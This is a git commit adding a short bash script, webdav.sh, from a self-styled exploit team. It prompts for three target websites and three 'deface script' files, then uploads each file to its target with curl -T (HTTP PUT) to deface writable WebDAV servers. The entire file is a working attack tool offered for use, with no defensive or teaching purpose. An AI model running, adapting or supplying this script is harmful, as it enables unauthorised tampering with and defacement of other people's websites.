9eb4fa997c71069084f3ccc20ca624452f57bbef
Tamado-spex <64205491+Tamado-spex@users.noreply.github.com>
2020-08-12 16:08:28 +0700

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,18 @@
+clear
+cowsay -f eyes 'WEBDAV
+
+# CREATE  : KING TND
+# TEAM    : KING CYBER XPLOIT
+# CONTACT : tamadonds@gmail.com' | lolcat
+
+
+read -p " Website Target ==> " target    
+read -p " Nama sript Defacenya ==> " sc;
+read -p " Website Target ==> " target1    
+read -p " Nama sript Defacenya ==> " sc1;
+read -p " Website Target ==> " target2    
+read -p " Nama sript Defacenya ==> " sc2;
+curl -T C:/Users/user/Desktop/$sc $target   
+curl -T C:/Users/user/Desktop/$sc1 $target1   
+curl -T C:/Users/user/Desktop/$sc2 $target2    
+echo " [!] FILE UPLOAD WITH SUCCES.... "
